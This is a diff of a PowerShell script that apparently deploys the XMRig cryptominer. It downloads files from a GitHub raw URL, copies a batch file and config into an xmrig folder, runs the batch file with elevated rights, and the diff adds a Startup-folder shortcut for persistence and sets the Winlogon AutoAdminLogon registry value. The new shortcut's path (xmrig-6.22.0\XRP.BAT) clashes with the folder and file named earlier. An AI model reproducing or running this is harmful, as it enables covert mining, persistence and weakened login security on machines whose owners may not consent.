@@ -10,5 +10,17 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/head
 Copy-Item -Path C:\XRPRUN.bat -Destination C:\xmrig-6.22.2\XRPRUN.bat -Force
 Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force
 Start-Process -FilePath 'C:\xmrig-6.22.2\XRPRUN.bat' -ArgumentList '/S' -Verb RunAs
-Copy-Item "C:\xmrig-6.22.2\XRPRUN.bat" "C:\Users\1111\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+$source = "C:\xmrig-6.22.0\XRP.BAT"
+$destination = "C:\Users\1111\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XRP.BAT.lnk"
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($destination)
+$shortcut.TargetPath = $source
+$shortcut.Save()
+$ShortcutPath = "$env:USERPROFILE\Desktop\Startup Folder.lnk"
+$TargetPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = $TargetPath
+$Shortcut.Save()
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "1"
 powershell.exe exit
